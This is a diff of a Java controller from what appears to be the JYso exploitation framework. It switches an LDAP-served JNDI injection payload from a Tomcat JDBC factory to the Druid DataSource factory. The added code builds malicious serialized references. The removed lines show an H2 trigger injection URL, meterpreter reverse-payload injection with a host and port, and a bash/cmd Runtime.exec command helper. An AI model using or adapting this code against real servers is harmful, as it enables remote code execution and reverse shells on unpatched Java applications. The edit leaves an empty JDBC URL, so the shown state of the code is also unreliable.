@@ -2,6 +2,8 @@ package com.qi4l.JYso.controllers;
 
 import com.qi4l.JYso.enumtypes.GadgetType;
 import com.qi4l.JYso.exceptions.IncorrectParamsException;
+import com.qi4l.JYso.exceptions.UnSupportedActionTypeException;
+import com.qi4l.JYso.exceptions.UnSupportedGadgetTypeException;
 import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
 import com.qi4l.JYso.gadgets.Config.Config;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
@@ -13,16 +15,15 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 
+import javax.naming.Reference;
 import javax.naming.StringRefAddr;
 import java.io.IOException;
 import java.lang.reflect.Field;
-import javax.naming.Reference;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
-@LdapMapping(uri = {"/tomcatjdbc"})
-public class TomcatJdbcController implements LdapController {
-
+@LdapMapping(uri = {"/druid"})
+public class DruidController implements LdapController{
     private String payloadType;
 
     private String     factoryType;
@@ -36,36 +37,16 @@ public class TomcatJdbcController implements LdapController {
             System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");
 
             Entry                                   e      = new Entry(base);
-            Reference                               ref    = new Reference("javax.sql.DataSource", factoryType, null);
-            TomcatJdbcController.TomcatBypassHelper helper = new TomcatJdbcController.TomcatBypassHelper();
+            Reference                               ref    = new Reference("javax.sql.DataSource", "com.alibaba.druid.pool.DruidDataSourceFactory", null);
             String                                  code   = null;
 
-            if (payloadType.contains("E-")) {
-                String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
-                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
-                code = InjShell.injectClass(EchoClass);
-            }
 
-            if (payloadType.contains("M-")) {
-                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
-                InjShell.init(params);
-                code = Gadgets.createClassT(ClassName1);
-            }
-
-            if (payloadType.contains("command")) {
-                code = helper.getExecCode(params[0]);
-            }
-
-            if (payloadType.contains("meterpreter")) {
-                code = helper.injectMeterpreter();
-            }
-
-            String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '//javascript\n{replacement}'";
-
+            String JDBC_URL = "";
             String JDBC_URL1 = JDBC_URL.replace("{replacement}", code);
             ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
             ref.add(new StringRefAddr("url", JDBC_URL1));
             ref.add(new StringRefAddr("initialSize", "1"));
+            ref.add(new StringRefAddr("init", "true"));
             e.addAttribute("javaClassName", "java.lang.String");
             e.addAttribute("javaSerializedData", Util.serialize(ref));
             result.sendSearchEntry(e);
@@ -139,37 +120,6 @@ public class TomcatJdbcController implements LdapController {
             if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
 
             throw new IncorrectParamsException("Incorrect params: " + base);
-        }
-    }
-
-    private class TomcatBypassHelper {
-
-        public String injectMeterpreter() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
-            Class<?> ctClazz      = Class.forName("com.qi4l.JYso.template.Meterpreter");
-            Field    WinClassName = ctClazz.getDeclaredField("host");
-            WinClassName.setAccessible(true);
-            WinClassName.set(ctClazz, params[0]);
-            Field WinclassBody = ctClazz.getDeclaredField("port");
-            WinclassBody.setAccessible(true);
-            WinclassBody.set(ctClazz, params[1]);
-            return InjShell.injectClass(ctClazz);
-        }
-
-        public String getExecCode(String cmd) throws IOException {
-
-            String code = "var strs=new Array(3);\n" +
-                    "        if(java.io.File.separator.equals('/')){\n" +
-                    "            strs[0]='/bin/bash';\n" +
-                    "            strs[1]='-c';\n" +
-                    "            strs[2]='" + cmd + "';\n" +
-                    "        }else{\n" +
-                    "            strs[0]='cmd';\n" +
-                    "            strs[1]='/C';\n" +
-                    "            strs[2]='" + cmd + "';\n" +
-                    "        }\n" +
-                    "        java.lang.Runtime.getRuntime().exec(strs);";
-
-            return code;
         }
     }
 }
